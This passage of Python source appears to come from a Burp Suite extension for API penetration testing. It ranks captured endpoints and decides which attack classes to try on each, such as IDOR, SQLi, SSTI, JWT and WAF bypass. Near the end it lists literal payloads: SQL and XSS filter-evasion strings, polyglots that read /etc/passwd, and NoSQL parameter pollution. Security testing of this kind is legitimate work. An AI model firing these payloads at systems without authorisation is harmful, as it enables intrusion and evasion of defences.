    for key in ["url", "body", "json", "cookie"]:
        param_count += len(params.get(key, []))

    has_id_hint = bool(
        "{id}" in path or "{uuid}" in path or "{objectid}" in path
    )
    has_auth_context = any(x != "none" for x in auth)
    has_write_method = method in ["POST", "PUT", "PATCH", "DELETE"]

    if len(path) > 220 and not (has_api_signal or has_write_method):
        return False
    if re.search(r"/[a-z0-9_-]{80,}", path) and not (has_api_signal or has_write_method):
        return False

    if has_api_signal:
        return True
    if has_write_method and has_auth_context:
        return True
    if has_id_hint and has_auth_context and has_api_signal:
        return True
    if (
        method in ["POST", "PUT", "PATCH"]
        and param_count >= 2
        and first_part
        and first_part not in self.FUZZER_STATIC_PATH_PARTS
    ):
        return True
    return False

def _fuzzer_sparse_candidate_score(self, normalized, strict=True):
    """Score non-API-like endpoints that still look testable for sparse campaigns."""
    method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
    path = self._ascii_safe(normalized.get("path") or "/", lower=True).strip()
    content_type = self._ascii_safe(normalized.get("content_type"), lower=True).strip()
    params = normalized.get("params", {}) or {}
    auth = [self._ascii_safe(x, lower=True) for x in (normalized.get("auth", []) or [])]

    first_part = ""
    parts = [p for p in path.strip("/").split("/") if p]
    if parts:
        first_part = parts[0]

    if strict and self._path_contains_noise_marker(path, self.FUZZER_STRICT_NOISE_PATH_MARKERS):
        return 0
    if self._path_contains_noise_marker(path, self.PARAM_MINER_NOISE_PATH_MARKERS):
        return 0
    if path.endswith(self.PASSIVE_STATIC_EXTENSIONS):
        return 0
    if first_part in self.FUZZER_STATIC_PATH_PARTS:
        return 0
    if self._ffuf_is_noise_path_segment(first_part):
        return 0
    if self._is_frontend_route(path, content_type):
        return 0
    if (
        "javascript" in content_type
        or "ecmascript" in content_type
        or "text/css" in content_type
        or content_type.startswith("image/")
        or content_type.startswith("font/")
        or content_type.startswith("video/")
        or content_type.startswith("audio/")
    ):
        return 0

    path_keywords = [
        "api",
        "graphql",
        "auth",
        "token",
        "session",
        "account",
        "user",
        "profile",
        "order",
        "cart",
        "checkout",
        "payment",
        "invoice",
        "search",
        "query",
        "filter",
        "export",
        "import",
        "upload",
        "download",
        "admin",
        "internal",
    ]
    has_path_keywords = any(token in path for token in path_keywords)
    has_auth_context = any(x != "none" for x in auth)
    has_api_signal = self._fuzzer_has_api_signal(normalized)
    has_object_target = self._fuzzer_has_object_target(normalized)
    has_write_method = method in ["POST", "PUT", "PATCH", "DELETE"]

    param_count = 0
    for key in ["url", "body", "json", "cookie"]:
        param_count += len(params.get(key, []))

    score = 0
    if has_api_signal:
        score += 4
    if has_write_method:
        score += 3
    if has_auth_context:
        score += 2
    if has_object_target:
        score += 2
    if param_count >= 1:
        score += 1
    if param_count >= 3:
        score += 1
    if has_path_keywords:
        score += 2
    if re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path):
        score += 1

    if (not has_write_method) and (not has_api_signal) and (not has_path_keywords):
        return 0
    if method == "GET" and score < 4:
        return 0
    if len(path) > 220 and score < 6:
        return 0
    return score

def _augment_fuzzer_targets_sparse(self, filtered, sparse_candidates, strict=True):
    """Add bounded heuristic candidates when campaigns are too sparse."""
    current_targets = filtered if isinstance(filtered, dict) else {}
    candidate_pool = sparse_candidates if isinstance(sparse_candidates, dict) else {}
    if not candidate_pool:
        return 0

    target_floor = 8 if strict else 12
    max_additional = 8 if strict else 14
    current_count = len(current_targets)
    if current_count >= target_floor:
        return 0

    shortage = max(0, target_floor - current_count)
    allowance = min(max_additional, shortage + 2)
    ranked = sorted(
        candidate_pool.items(),
        key=lambda item: (
            int((item[1] or {}).get("score", 0)),
            len((item[1] or {}).get("entries", []) or []),
        ),
        reverse=True,
    )

    added = 0
    for endpoint_key, payload in ranked:
        if endpoint_key in current_targets:
            continue
        candidate_entries = list((payload or {}).get("entries", []) or [])
        if not candidate_entries:
            continue
        current_targets[endpoint_key] = candidate_entries
        added += 1
        if added >= allowance:
            break
    return added

def _collect_fuzzer_targets(self, strict=True):
    """Collect fuzzer targets from first-party/API-like entries only."""
    raw_snapshot = {}
    with self.lock:
        for key, raw_entries in self.api_data.items():
            if isinstance(raw_entries, list):
                raw_snapshot[key] = list(raw_entries)
            elif isinstance(raw_entries, dict):
                raw_snapshot[key] = [raw_entries]

    filter_cfg = self._build_passive_filter_config(raw_snapshot)
    filtered = {}
    sparse_candidates = {}
    excluded_endpoints = 0

    for key, entries in raw_snapshot.items():
        kept_entries = []
        sparse_entries = []
        sparse_score = 0
        entries_list = entries if isinstance(entries, list) else [entries]
        for entry in entries_list:
            if not isinstance(entry, dict):
                continue
            if not self._passive_entry_allowed(entry, filter_cfg):
                continue
            normalized = self._normalize_endpoint_data(entry)
            status = int(normalized.get("response_status", 200) or 200)
            if status == 404:
                continue
            if not self._fuzzer_endpoint_is_api_like(normalized, strict=strict):
                candidate_score = self._fuzzer_sparse_candidate_score(
                    normalized, strict=strict
                )
                if candidate_score > 0:
                    sparse_entries.append(entry)
                    sparse_score = max(sparse_score, candidate_score)
                continue
            kept_entries.append(entry)

        if kept_entries:
            filtered[key] = kept_entries
        else:
            excluded_endpoints += 1
            if sparse_entries:
                sparse_candidates[key] = {
                    "entries": sparse_entries,
                    "score": sparse_score,
                }

    sparse_added = self._augment_fuzzer_targets_sparse(
        filtered, sparse_candidates, strict=strict
    )
    effective_excluded = max(0, excluded_endpoints - sparse_added)

    return filtered, {
        "raw_endpoints": len(raw_snapshot),
        "filtered_endpoints": len(filtered),
        "excluded_endpoints": effective_excluded,
        "sparse_candidate_endpoints": len(sparse_candidates),
        "sparse_fallback_added": sparse_added,
    }

def _path_contains_noise_marker(self, path, markers):
    """Check whether path contains any marker from a marker list."""
    text = self._ascii_safe(path, lower=True).strip()
    if not text:
        return False
    return any(marker in text for marker in markers)

def _collect_param_targets(self, strict_base=True):
    """Collect Param Miner targets with first-party/API-like and ad-tech noise filtering."""
    base_targets, base_meta = self._collect_fuzzer_targets(strict=strict_base)
    filtered = {}
    excluded_method = 0
    excluded_noise = 0
    excluded_non_api = 0

    for key, entries in base_targets.items():
        entry = self._get_entry(entries)
        normalized = self._normalize_endpoint_data(entry)
        method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
        if method not in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
            excluded_method += 1
            continue

        path = self._ascii_safe(normalized.get("path") or "/", lower=True)
        content_type = self._ascii_safe(
            normalized.get("content_type"), lower=True
        ).strip()
        auth = [
            self._ascii_safe(x, lower=True)
            for x in (normalized.get("auth", []) or [])
        ]
        has_auth_context = any(x != "none" for x in auth)
        has_api_marker = bool(
            "/api/" in path
            or "/graphql" in path
            or "/rest/" in path
            or "/openapi" in path
            or "/swagger" in path
            or "/metadata/" in path
            or "/oauth" in path
            or "/auth/" in path
            or re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path)
        )
        has_structured_content = bool(
            (
                "json" in content_type
                or "xml" in content_type
                or "protobuf" in content_type
                or "x-www-form-urlencoded" in content_type
                or "multipart/form-data" in content_type
            )
            and "javascript" not in content_type
            and "html" not in content_type
        )

        if self._path_contains_noise_marker(
            path, self.PARAM_MINER_STRICT_NOISE_PATH_MARKERS
        ):
            excluded_noise += 1
            continue
        if (not has_auth_context) and self._path_contains_noise_marker(
            path, self.PARAM_MINER_NOISE_PATH_MARKERS
        ):
            excluded_noise += 1
            continue
        if method == "GET" and (not has_api_marker) and (not has_structured_content):
            excluded_non_api += 1
            continue
        if self._is_frontend_route(path, content_type):
            excluded_non_api += 1
            continue

        filtered[key] = entries

    return filtered, {
        "raw_endpoints": base_meta.get("raw_endpoints", 0),
        "filtered_endpoints": len(filtered),
        "excluded_endpoints": base_meta.get("excluded_endpoints", 0)
        + excluded_method
        + excluded_noise
        + excluded_non_api,
        "excluded_method": excluded_method,
        "excluded_noise": excluded_noise,
        "excluded_non_api": excluded_non_api,
    }

def _collect_version_targets(self, lenient=False):
    """Collect Version Scanner targets from Param Miner scoped target set."""
    param_targets, param_meta = self._collect_param_targets(
        strict_base=not bool(lenient)
    )
    filtered = {}
    excluded_non_api = 0
    excluded_noise = 0
    retained_versioned = 0

    for key, entries in param_targets.items():
        entry = self._get_entry(entries)
        normalized = self._normalize_endpoint_data(entry)
        path = self._ascii_safe(normalized.get("path") or "/", lower=True)
        method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
        content_type = self._ascii_safe(
            normalized.get("content_type"), lower=True
        ).strip()
        has_structured_content = bool(
            (
                "json" in content_type
                or "xml" in content_type
                or "protobuf" in content_type
                or "x-www-form-urlencoded" in content_type
                or "multipart/form-data" in content_type
            )
            and "javascript" not in content_type
            and "html" not in content_type
        )
        if self._path_contains_noise_marker(
            path, self.VERSION_SCANNER_NOISE_PATH_MARKERS
        ):
            excluded_noise += 1
            continue
        already_versioned = bool(self._extract_version_segment(path))

        api_marker = any(x in path for x in ["/api/", "/svc/", "/rest/", "/graphql"])
        if (not already_versioned) and (not api_marker) and method not in [
            "POST",
            "PUT",
            "PATCH",
            "DELETE",
        ]:
            if lenient and has_structured_content:
                filtered[key] = entries
                continue
            excluded_non_api += 1
            continue

        filtered[key] = entries
        if already_versioned:
            retained_versioned += 1

    return filtered, {
        "raw_endpoints": param_meta.get("raw_endpoints", 0),
        "filtered_endpoints": len(filtered),
        "excluded_noise": excluded_noise,
        "excluded_endpoints": param_meta.get("excluded_endpoints", 0)
        + excluded_non_api
        + excluded_noise,
        "retained_versioned": retained_versioned,
        "excluded_non_api": excluded_non_api,
    }

def _generate_fuzzing_attacks(self, endpoints, attack_type):
    """Core fuzzing logic - pure function for testing"""
    attacks = []
    for key, entries in endpoints.items():
        try:
            entry = self._get_entry(entries)
            normalized = self._normalize_endpoint_data(entry)
            
            # Skip non-existent endpoints (404s)
            if normalized["response_status"] == 404:
                continue
            
            # Skip frontend routes that aren't APIs
            path = normalized["path"].lower()
            if self._is_frontend_route(path, normalized["content_type"]):
                continue
            
            checks = [
                self._check_bola(normalized, attack_type),
                self._check_idor(normalized, attack_type),
                self._check_auth_bypass(normalized, attack_type),
                self._check_sqli(normalized, attack_type),
                self._check_xss(normalized, attack_type),
                self._check_ssrf(normalized, attack_type),
                self._check_xxe(normalized, attack_type),
                self._check_nosqli(normalized, attack_type),
                self._check_path_traversal(normalized, attack_type),
                self._check_mass_assignment(normalized, attack_type),
                self._check_race_condition(normalized, attack_type),
                self._check_graphql(normalized, attack_type),
                self._check_jwt(normalized, attack_type),
                self._check_ssti(normalized, attack_type),
                self._check_deserialization(normalized, attack_type),
                self._check_business_logic(normalized, attack_type),
                self._check_waf_bypass(normalized, attack_type),
            ]
            for attack in checks:
                if attack:
                    attack["_score"] = self._score_fuzz_attack(key, attack, normalized)
                    attacks.append((key, attack))
        except Exception as e:
            self._callbacks.printError(
                "Error processing {}: {}".format(key, str(e))
            )
    attacks.sort(
        key=lambda item: (
            int((item[1] or {}).get("_score", 0) or 0),
            self._ascii_safe((item[1] or {}).get("type") or "", lower=True),
        ),
        reverse=True,
    )
    return attacks

def _check_race_condition(self, normalized, attack_type):
    if not self._attack_selected(attack_type, ["Race Condition"]):
        return None
    if normalized["method"] not in ["POST", "PUT", "PATCH", "DELETE"]:
        return None
    path = normalized["path"].lower()
    if not any(
        k in path for k in ["coupon", "redeem", "purchase", "transfer", "withdraw"]
    ):
        return None
    rc = self._get_race_condition_payloads()
    return {
        "type": "Race Condition",
        "techniques": rc["techniques"],
        "targets": rc["targets"],
        "test": "Send parallel requests to exploit TOCTOU",
        "risk": "Double spending, inventory bypass, rate limit bypass",
    }

def _check_graphql(self, normalized, attack_type):
    if not self._attack_selected(attack_type, ["GraphQL"]):
        return None
    if "graphql" not in normalized["path"].lower():
        return None
    gql = self._get_graphql_attacks()
    return {
        "type": "GraphQL Abuse",
        "introspection": gql["introspection"][:2],
        "attacks": [
            "Introspection queries",
            "Batching (array/alias)",
            "Depth limit bypass",
            "Directive overloading",
            "Field suggestion",
            "Circular fragments",
            "Mutation injection",
        ],
        "payloads": gql["batching"] + gql["aliases"][:2] + gql["directive_overload"][:2] + gql["field_suggestion"][:2],
        "test": "DoS via batching/depth, info disclosure via field suggestion, introspection bypass",
        "risk": "DoS, data exfiltration, unauthorized mutations, schema disclosure",
    }

def _check_jwt(self, normalized, attack_type):
    if not self._attack_selected(attack_type, ["JWT"]):
        return None
    if "Bearer Token" not in normalized["auth"]:
        return None
    jwt = self._get_jwt_attacks()
    return {
        "type": "JWT Exploitation",
        "attacks": jwt["alg_confusion"] + jwt["kid_injection"][:2],
        "claims": jwt["claims"],
        "test": "Algorithm confusion, kid injection, claim manipulation",
        "risk": "Authentication bypass, privilege escalation",
    }

def _check_ssti(self, normalized, attack_type):
    if not self._attack_selected(attack_type, ["SSTI"]):
        return None
    if not self._fuzzer_has_api_signal(normalized):
        return None
    params = normalized["params"]
    candidate_params = list(params.get("url", [])) + list(params.get("body", [])) + list(
        params.get("json", [])
    )
    if not candidate_params:
        return None
    candidate_params_lower = [self._ascii_safe(x, lower=True) for x in candidate_params]
    path = self._ascii_safe(normalized.get("path") or "/", lower=True)
    ssti_params = []
    for idx, name in enumerate(candidate_params_lower):
        if any(keyword in name for keyword in self.FUZZER_SSTI_PARAM_KEYWORDS):
            ssti_params.append(candidate_params[idx])
    path_hits = any(
        marker in path
        for marker in ["/template", "/render", "/preview", "/email", "/view", "/compile"]
    )
    if not ssti_params and not path_hits:
        return None
    return {
        "type": "SSTI",
        "payloads": self._get_ssti_payloads()[:6],
        "params": ssti_params[:5],
        "test": "Template injection in params",
        "risk": "Remote code execution",
    }

def _check_deserialization(self, normalized, attack_type):
    if not self._attack_selected(attack_type, ["Deserialization"]):
        return None
    ct = normalized["content_type"].lower()
    if "java" not in ct and "serializ" not in ct and "application/octet" not in ct:
        return None
    return {
        "type": "Deserialization",
        "payloads": self._get_deserialization_payloads()[:3],
        "test": "Inject malicious serialized objects",
        "risk": "Remote code execution",
    }

def _check_business_logic(self, normalized, attack_type):
    if not self._attack_selected(attack_type, ["Business Logic"]):
        return None
    path = normalized["path"].lower()
    if not any(
        k in path
        for k in ["price", "amount", "quantity", "payment", "checkout", "order"]
    ):
        return None
    bl = self._get_business_logic_tests()
    return {
        "type": "Business Logic",
        "price_tests": bl["price_manipulation"],
        "quantity_tests": bl["quantity_abuse"],
        "test": "Negative values, overflow, workflow bypass",
        "risk": "Financial loss, inventory manipulation",
    }

def _is_frontend_route(self, path, content_type):
    """Detect if endpoint is a frontend route (not an API)"""
    # Frontend route indicators
    frontend_patterns = [
        "/auction/", "/post/", "/comment/", "/user/", "/profile/",
        "/article/", "/page/", "/view/", "/show/"
    ]
    
    # If it returns HTML and matches frontend patterns, it's likely a UI route
    if "html" in content_type.lower():
        if any(pattern in path for pattern in frontend_patterns):
            return True
    
    # If it has {id} but no /api/ prefix and returns HTML, likely frontend
    if "{id}" in path and "/api/" not in path and "html" in content_type.lower():
        return True
        
    return False

def _check_waf_bypass(self, normalized, attack_type):
    """Check if endpoint should be tested for WAF bypass (pure function)"""
    if not self._attack_selected(attack_type, ["WAF Bypass"]):
        return None
    if not self._fuzzer_has_api_signal(normalized, include_write_method=True):
        return None

    method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
    path = self._ascii_safe(normalized.get("path") or "/", lower=True)
    status = int(normalized.get("response_status", 0) or 0)
    auth = [self._ascii_safe(x, lower=True) for x in (normalized.get("auth", []) or [])]
    has_auth_context = any(x != "none" for x in auth)
    has_guarded_status = status in [401, 403, 405, 406, 415, 429, 451]
    has_sensitive_surface = any(
        marker in path
        for marker in ["/api/", "/graphql", "/auth", "/token", "/admin", "/upload", "/gateway"]
    )
    if (not has_guarded_status) and (not has_sensitive_surface) and (not has_auth_context):
        if method not in ["POST", "PUT", "PATCH", "DELETE"]:
            return None

    return {
        "type": "WAF Bypass",
        "test": "Header injection, encoding bypass, method override, path pollution",
        "risk": "WAF evasion leading to exploitation of underlying vulnerabilities",
    }

def _get_sql_comment_obfuscation(self):
    """SQL comment-based obfuscation"""
    return ["UN/**/ION","SEL/**/ECT","OR/**/1=1","UN/*!50000ION*/","/*!50000SELECT*/","UN/**/I/**/ON","S/**/E/**/L/**/E/**/C/**/T","UNION#comment\nSELECT","OR#\n1=1","UNION-- \nSELECT"]

def _get_polyglot_payloads(self):
    """Polyglot payloads (multi-context)"""
    return ["';alert(1)//","';alert(String.fromCharCode(88,83,83))//","' OR 1=1--<script>alert(1)</script>","; cat /etc/passwd' OR '1'='1","*)(uid=*))(|(uid=*' OR '1'='1"]

def _get_whitespace_obfuscation(self):
    """Whitespace-based obfuscation"""
    return ["UNION\tSELECT","OR\t1=1","UNION\nSELECT","OR\n1=1","UNION\rSELECT","UNION  SELECT","OR   1=1","UNION\t\nSELECT","UNION\fSELECT"]

def _get_charset_manipulation(self):
    """Character set manipulation"""
    return ["%c0%27","%c0%22","%u0027","%u003c","%u0022","%u003e","%c1%1c","%c1%9c"]

def _get_http_parameter_pollution(self):
    """HTTP Parameter Pollution"""
    return ["id=1&id=2","id=1&id=' OR '1'='1","id[]=1&id[]=2","id[0]=1&id[1]=2","id=1&id[]=2","id={\"$ne\":null}","filter={\"$gt\":\"\"}"]

def _get_unicode_normalization(self):
    """Unicode normalization bypasses"""
    return ["\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e","s\u0300cript","\u0430lert","\u0441ript","s\u200bcript","al\u200dert"]

__all__ = [
    "registerExtenderCallbacks",
    "_initialize_runtime_state",
    "_setting_key",
    "_load_bool_setting",
    "_save_bool_setting",
    "_load_text_setting",
    "_save_text_setting",
    "_persist_checkbox_attr",
    "_persist_text_attr",
    "_combo_contains_item",
    "_persist_combo_attr",
    "_restore_persisted_ui_state",
    "_initialize_pagination_state",
    "_initialize_main_panel",
    "_build_recon_top_panel",
    "_build_recon_center_split",
    "_build_recon_button_panel",
    "_build_recon_tab",
    "_create_tabs",
    "_initialize_output_dir",
    "_register_extension_callbacks",
    "_create_action_button",
    "_resolve_action_button_tooltip",
    "_resolve_checkbox_tooltip",
    "_set_component_tooltip",
    "_apply_component_tooltips",
    "_apply_default_tooltips_recursively",
    "_configure_tooltips",
    "_build_recon_invariant_status_text",
    "_refresh_recon_invariant_status_label",
    "_refresh_recon_invariant_status_label_async",
    "_refresh_sequence_invariants_from_recon",
    "_normalize_profile",
    "_profile_labels",
    "_selected_profile_value",
    "_sqlmap_profile_settings",
    "_build_sqlmap_command",
    "_dalfox_profile_settings",
    "_build_dalfox_command",
    "_asset_profile_settings",
    "_nuclei_profile_settings",
    "_evaluate_help_text",
    "_add_target_scope_controls",
    "_set_target_base_scope_only",
    "_add_force_kill_button",
    "_create_command_preset_combo",
    "_create_preset_help_button",
    "_create_text_area_panel",
    "_show_recon_button_help",
    "_copy_to_clipboard",
    "_export_text_output_to_ai",
    "_create_diff_tab",
    "_load_diff_file",
    "_run_diff",
    "_create_scanner_tab",
    "_create_version_tab",
    "_format_result",
    "_scan_versions",
    "_build_version_test_path",
    "_export_version_results",
    "_create_param_tab",
    "_create_logger_tab",
    "_mine_params",
    "_export_param_results",
    "_create_fuzzer_tab",
    "_create_sqlmap_verify_tab",
    "_create_dalfox_verify_tab",
    "_create_api_asset_discovery_tab",
    "_create_openapi_drift_tab",
    "_create_auth_replay_tab",
    "_create_passive_discovery_tab",
    "_create_nuclei_tab",
    "_create_httpx_tab",
    "_create_katana_tab",
    "_create_ffuf_tab",
    "_create_wayback_tab",
    "_create_apihunter_tab",
    "_create_graphql_tab",
    "_get_idor_payloads",
    "_get_bola_techniques",
    "_get_race_condition_payloads",
    "_get_graphql_attacks",
    "_get_jwt_attacks",
    "_get_api_abuse_vectors",
    "_get_business_logic_tests",
    "_get_sqli_payloads",
    "_get_xss_payloads",
    "_get_nosqli_payloads",
    "_get_path_traversal_payloads",
    "_get_ssrf_payloads",
    "_get_xxe_payloads",
    "_get_ssti_payloads",
    "_get_deserialization_payloads",
    "_get_waf_bypass_headers",
    "_get_waf_bypass_encoding",
    "_get_waf_bypass_http_methods",
    "_get_waf_bypass_path_tricks",
    "_get_waf_bypass_content_type",
    "_get_entry",
    "_normalize_endpoint_data",
    "_normalize_param_list",
    "_attack_selected",
    "_fuzzer_has_api_signal",
    "_fuzzer_has_object_target",
    "_check_idor",
    "_check_bola",
    "_check_auth_bypass",
    "_check_sqli",
    "_check_xss",
    "_check_ssrf",
    "_check_xxe",
    "_check_nosqli",
    "_check_path_traversal",
    "_check_mass_assignment",
    "_generate_attack_lines",
    "_score_fuzz_attack",
    "_fuzzer_endpoint_is_api_like",
    "_fuzzer_sparse_candidate_score",
    "_augment_fuzzer_targets_sparse",
    "_collect_fuzzer_targets",
    "_path_contains_noise_marker",
    "_collect_param_targets",
    "_collect_version_targets",
    "_generate_fuzzing_attacks",
    "_check_race_condition",
    "_check_graphql",
    "_check_jwt",
    "_check_ssti",
    "_check_deserialization",
    "_check_business_logic",
    "_is_frontend_route",
    "_check_waf_bypass",
    "_get_sql_comment_obfuscation",
    "_get_polyglot_payloads",
    "_get_whitespace_obfuscation",
    "_get_charset_manipulation",
    "_get_http_parameter_pollution",
    "_get_unicode_normalization",
]
